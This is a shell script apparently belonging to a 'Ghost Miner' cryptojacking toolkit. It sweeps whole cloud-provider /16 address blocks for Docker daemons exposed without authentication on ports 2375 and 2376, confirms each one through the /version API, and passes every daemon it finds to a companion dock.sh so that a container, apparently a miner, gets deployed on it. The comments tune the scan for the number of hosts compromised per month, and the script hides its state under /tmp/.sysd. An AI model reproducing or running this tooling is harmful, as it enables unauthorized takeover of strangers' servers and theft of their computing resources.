#!/bin/sh
# ============================================================================
# Ghost Miner docker mass sweeper - the volume arm of the docker vector.
#
# dock.sh only ever scans hosts a leaked-key repo happened to mention, and that
# queue turns out to be mostly noise: 17 rows are the literal placeholder
# 1.2.3.4, 1.3.6.1 is an SNMP OID, 2.6.33.7 is a kernel version, and Google /
# GitHub / Fastly addresses can never be ours. That leaves ~45 usable hosts, so
# the expected daemon count is ~0 - the repo queue can never feed this vector.
#
# But the docker vector needs NO credential match, so its target set is a free
# parameter: point it at whole cloud prefix blocks, where boxes with an exposed
# :2375 actually live. Measured here: 1778 addresses in 47s at parallel 64, and
# 0 of 3048 addresses in hetzner/DO space even answered on 2375 - the port is
# genuinely rare (Shodan sees ~150k exposed daemons on the whole IPv4, i.e.
# ~0.003%), so expect a few per /16 rather than none, and volume comes from
# prefix blocks rather than from better GitHub queries.
#
# Sweeps each /16 in MASS_NETS (a bare /24 like 167.233.74 also works) one /24 at
# a time, probing :2375 and TLS :2376 at the same time (so the extra port costs
# no wall-clock), checks the reply really is a docker API, and appends the daemon
# to .hunt/mass.found -
# which dock.sh reads as queue, so the normal, already-tested deploy path places
# the container and dock.sh's own state stops it re-scanning that host.
#
# State: .hunt/mass.done (ts \t /24, re-swept after MASS_REFRESH seconds - new
# daemons appear over time) and .hunt/mass.found (ip \t docker=version).
# Bounded by MASS_BUDGET seconds per run so it never monopolises the box.
#
# usage: dockmass.sh [stat|run] [net ...]
# ============================================================================
set -eu

SELF_DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
SYSDIR="${SYSDIR:-/tmp/.sysd}"
# Snapshot env overrides BEFORE sourcing: worker.env publishes plain assignments,
# so it would otherwise swallow an ad-hoc "MASS_BUDGET=60 sh dockmass.sh".
# Precedence: environment > worker.env > built-in default.
E_PAR="${MASS_PAR:-}"; E_BUDGET="${MASS_BUDGET:-}"; E_NETS="${MASS_NETS:-}"
E_TLS="${MASS_TLS:-}"; E_REFRESH="${MASS_REFRESH:-}"; E_DEPLOY="${MASS_DEPLOY:-}"
[ -r "$SYSDIR/worker.env" ] && . "$SYSDIR/worker.env"
[ -r "$SELF_DIR/worker.env" ] && . "$SELF_DIR/worker.env"
WORK="${HUNT_WORK:-$SELF_DIR/.hunt}"
mkdir -p "$WORK"

PAR="${E_PAR:-${MASS_PAR:-64}}"
BUDGET="${E_BUDGET:-${MASS_BUDGET:-600}}"
REFRESH="${E_REFRESH:-${MASS_REFRESH:-2592000}}"
TLS2376="${E_TLS:-${MASS_TLS:-no}}"
DEPLOY="${E_DEPLOY:-${MASS_DEPLOY:-yes}}"
DONE="$WORK/mass.done"
FOUND="$WORK/mass.found"
touch "$DONE" "$FOUND"
# queue/scratch files from an instance that got killed (timer overlap) linger
find "$WORK" -name 'mass.q.*' -mmin +60 -delete 2>/dev/null || :
find "$WORK" -name 'mass.one.*' -mmin +60 -delete 2>/dev/null || :
find "$WORK" -name 'mass.ips.*' -mmin +60 -delete 2>/dev/null || :
find "$WORK" -type d -name 'massprobe.*' -mmin +60 -exec rm -rf {} + 2>/dev/null || :
# scratch dir for the per-address probes (name is unique per address, so a
# hundred children can share one directory)
D="$WORK/massprobe.$$"
mkdir -p "$D"

case "${1:-run}" in
    stat)
        nf_txt=0
        for nf in "$SELF_DIR/nets.txt" "$SYSDIR/nets.txt"; do
            [ -s "$nf" ] && { nf_txt=$(tr -d '\r' < "$nf" | grep -c .); break; }
        done
        echo "dockmass: swept /24s $(wc -l < "$DONE")  daemons found $(wc -l < "$FOUND")"
        echo "dockmass: nets in worker.env: $(printf '%s\n' ${E_NETS:-${MASS_NETS:-none-set}} | grep -c .)"
        echo "dockmass: nets in nets.txt: $nf_txt"
        echo "dockmass: budget ${BUDGET}s par ${PAR} refresh ${REFRESH}s tls ${TLS2376} deploy ${DEPLOY}"
        exit 0 ;;
    run)
        if [ "$#" -gt 0 ]; then shift; fi ;;
    *)  echo "usage: $0 [stat|run] [net ...]"; exit 2 ;;
esac

NETS="${E_NETS:-${MASS_NETS:-5.9 88.198 64.227 45.32 51.75 62.210}}"
# Volume comes from a large provider-precise list (see netbuild.sh) kept in its
# own file so worker.env stays readable. Why it matters: a host's yield per day is
# scan rate x density (~30 addr/s x 1e-5 = ~26 daemons/day) regardless of list
# length, but a SHORT list makes it finish in ~2 days and idle for the rest of the
# MASS_REFRESH window - which is the difference between ~44 hosts/month and ~780.
# CR is stripped because the file may have been written on Windows.
if [ "${MASS_NETS_FILE:-yes}" = yes ]; then
    for nf in "$SELF_DIR/nets.txt" "$SYSDIR/nets.txt"; do
        [ -s "$nf" ] || continue
        NETS="$NETS $(tr -d '\r' < "$nf" | tr '\n' ' ')"
        break
    done
fi
if [ "$#" -gt 0 ]; then NETS="$*"; fi
NOW=$(date +%s)

# forget swept /24s older than REFRESH, so they come back round again
if [ -s "$DONE" ]; then
    awk -v now="$NOW" -v r="$REFRESH" '$1 > now - r' "$DONE" > "$DONE.new" || :
    mv -f "$DONE.new" "$DONE"
fi

Q="$WORK/mass.q.$$"
for n in $NETS; do
    case "$n" in
        *.*.*)  printf '%s\n' "$n" ;;          # already a /24, sweep as-is
        *)      i=0
                while [ "$i" -lt 256 ]; do
                    printf '%s.%s\n' "$n" "$i"
                    i=$((i + 1))
                done ;;
    esac
done | {
    if [ -s "$DONE" ]; then grep -vxF -f "$DONE"; else cat; fi
} > "$Q"

# one address: must answer with docker JSON, not just an open port
ONE="$WORK/mass.one.$$"
cat > "$ONE" <<'EOF'
ip=$1
# fire both ports at once: worst case is then one timeout, not two
curl -fsS -m 2 --connect-timeout 2 "http://$ip:2375/version" > "$D/p.$ip.2375" 2>/dev/null &
if [ "${TLS2376:-yes}" = yes ]; then
    curl -fsS -k -m 2 --connect-timeout 2 "https://$ip:2376/version" > "$D/p.$ip.2376" 2>/dev/null &
fi
wait
port=2375
r=$(cat "$D/p.$ip.2375" 2>/dev/null)
if [ -z "$r" ]; then
    port=2376
    r=$(cat "$D/p.$ip.2376" 2>/dev/null)
fi
rm -f "$D/p.$ip.2375" "$D/p.$ip.2376"
case "$r" in *ApiVersion*) ;; *) exit 0 ;; esac
v=$(printf '%s' "$r" | grep -o '"Version":"[^"]*"' | head -1 | cut -d'"' -f4)
printf '%s\t%s\n' "$ip" "docker=${v:-?}@$port" >> "$FOUND"
EOF

T0=$(date +%s)
swept=0
ips=0
prev=$(wc -l < "$FOUND")
while read -r p; do
    [ -n "$p" ] || continue
    if [ $(( $(date +%s) - T0 )) -ge "$BUDGET" ]; then
        echo "dockmass: budget ${BUDGET}s reached, $swept /24s swept this run"
        break
    fi
    j=1
    while [ "$j" -lt 255 ]; do
        printf '%s.%s\n' "$p" "$j"
        j=$((j + 1))
    done > "$WORK/mass.ips.$$"
    D="$D" FOUND="$FOUND" TLS2376="$TLS2376" xargs -P "$PAR" -n 1 sh "$ONE" < "$WORK/mass.ips.$$"
    printf '%s\t%s\n' "$(date +%s)" "$p" >> "$DONE"
    swept=$((swept + 1))
    ips=$((ips + 254))
done < "$Q"
rm -f "$Q" "$ONE" "$WORK/mass.ips.$$"
rm -rf "$D"
sort -u "$FOUND" -o "$FOUND" 2>/dev/null || :
if [ -s "$FOUND" ]; then   # one line per address (version/port churn included)
    awk -F'\t' '!s[$1]++' "$FOUND" > "$FOUND.n" 2>/dev/null && mv -f "$FOUND.n" "$FOUND" || :
fi
new=$(( $(wc -l < "$FOUND") - prev ))
echo "dockmass: swept $swept /24s ($ips addresses), daemons known $(wc -l < "$FOUND") (+$new)"

# hand fresh daemons to the normal deploy path immediately
if [ "$new" -gt 0 ] && [ "$DEPLOY" = yes ] && [ -r "$SELF_DIR/dock.sh" ]; then
    echo "dockmass: handing $new new daemon(s) to dock.sh"
    HUNT_WORK="$WORK" sh "$SELF_DIR/dock.sh" || :
fi
